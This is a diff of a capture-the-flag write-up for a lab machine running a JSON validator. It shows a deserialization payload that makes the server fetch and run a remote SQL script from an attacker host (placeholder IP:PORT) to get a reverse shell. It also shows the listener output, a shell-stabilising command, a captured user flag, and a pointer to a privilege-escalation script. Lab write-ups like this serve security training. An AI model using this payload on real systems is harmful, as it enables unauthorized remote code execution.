@@ -21,6 +21,8 @@ We see an online json beautifier & Validator with 2 options, "Beatify" & "Valida
 
 ![time](https://media.discordapp.net/attachments/490431433559506954/832936431823224862/unknown.png)
 
+## User FLag
+
 Now, you need to create a inject.sql files and add a reverse shell to have it call back to me. :
 
 ```sh
@@ -45,7 +47,7 @@ Now inject the payload to : "Validate!(Beta)".
 [“ch.qos.logback.core.db.DriverManagerConnectionSource”,{“url”:”jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM ‘http://IP:PORT/inject.sql'”}]
 ```
 
-and you got a reverseshell
+and you got a reverseshell running as the user pericles.
 
 ```sh
 listening on [any] 1337 ...
@@ -58,8 +60,18 @@ Now for a good stable shell, type :
 $python -c “import pty;pty.spawn(‘/bin/bash’)”
 $export TERM=xterm
 ```
+Got the user flag : 
 
+```
+pericles@time:/home/pericles$ cat user.txt 
+cat user.txt
+7u7243a41d508868b8c935c47b554ad7
+```
+## Privilege Escalation
 
+Try to upload linpeas ( LinPEAS is a script that search for possible paths to escalate privileges on Linux )
+
+Install linpeas <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">Linpeas</a>
 
 
 
